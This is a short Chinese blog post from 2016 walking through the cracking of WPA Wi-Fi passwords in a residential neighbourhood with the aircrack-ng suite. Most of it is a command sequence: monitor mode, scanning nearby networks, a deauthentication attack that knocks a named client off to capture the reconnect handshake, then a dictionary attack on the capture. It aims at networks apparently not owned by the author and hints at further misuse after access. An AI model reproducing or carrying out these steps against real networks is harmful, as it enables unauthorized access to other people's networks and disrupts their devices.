title: crackWifiPasswd
date: 2016-02-15 17:30:25
tags: aircrack
categories: crack
---

### 无线破解
声明: 仅作研究的一个笔记。 在小区内有很多的wifi热点, 正好手头有一个无线网卡, 尝试破解wifi密码。

<!--more-->

### 背景知识

常用的wifi加密web、wpa、wpa2, wifi破解屌爆了的工具aircrack-ng, 密码字典。

### 破解实战
1. 将无线网卡处于混杂模式（能够监听周围通过网卡的数据）[是指一台机器的网卡能够接收所有经过它的数据流，而不论其目的地址是否是它](https://zh.wikipedia.org/wiki/%E6%B7%B7%E6%9D%82%E6%A8%A1%E5%BC%8F)

```bash
 airmon-ng
```
![](http://ww4.sinaimg.cn/mw690/63fe561egw1f1159fnr4lj214c0c8q60.jpg)

```bash
airmon-ng start wlan0
```

![](http://ww3.sinaimg.cn/mw690/63fe561egw1f115chobo8j214w0matgn.jpg)

`回显的时候 提示有些存在的进程可能会影响airodump正常工作，确保正常工作，需要执行一下命令`

```bash
airmon-ng check kill all
```
```bash
iwconfig wlan0mon # 查看网卡是否处于混杂模式
```

```bash
airodump-ng waln0mon # 查看周围的无线网络
```
![](http://ww1.sinaimg.cn/large/63fe561egw1f115lckxtdj21e80nkam7.jpg)

**语法:airodump-ng –channel [x] –bssid [bssid] –write [filename] [interface?mon0]**

```bash
airodump-ng  -w qiu --bssid FC:D7:33:82:5B:10 wlan0mon
```
`再开一个终端, 模拟客户端mac, 进行网络洪水攻击, 直到抓到重连握手包`

```bash
aireplay-ng -0 10 --ignore-negative-one  -a  FC:D7:33:82:5B:10  -c 2C:BE:08:7B:81:48  wlan0mon
```
```bash
aircrack-ng -w WPA字典.txt qiu-*.cap
```
![](http://ww2.sinaimg.cn/mw690/63fe561egw1f13jd6q1o7j217o0wgwpo.jpg)

**!hack the passwd**

### 后记

抓到wifi的握手包之后，就是跑密码字典了，精心设计密码字典，就会事半功倍！破解wifi之后，还有更多好玩的东西！

### 参考文献
[http://www.freebuf.com/articles/wireless/59809.html](http://www.freebuf.com/articles/wireless/59809.html)

[http://aircrack-ng.org/documentation.html](http://aircrack-ng.org/documentation.html)

[http://www.aircrack-ng.org/doku.php?id=cracking_wpa](http://www.aircrack-ng.org/doku.php?id=cracking_wpa)

[https://sweetll.me](https://sweetll.me/2014/11/ubuntu-14-10-%E5%AF%B9%E4%BA%8Ewifi%E5%AF%86%E7%A0%81%E7%9A%84%E7%A0%B4%E8%A7%A3%E7%A0%94%E7%A9%B6-%E4%BB%A5%E5%8F%8A%E7%A0%B4%E8%A7%A3wifi%E5%90%8E%E8%83%BD%E5%B9%B2%E4%BB%80%E4%B9%88/)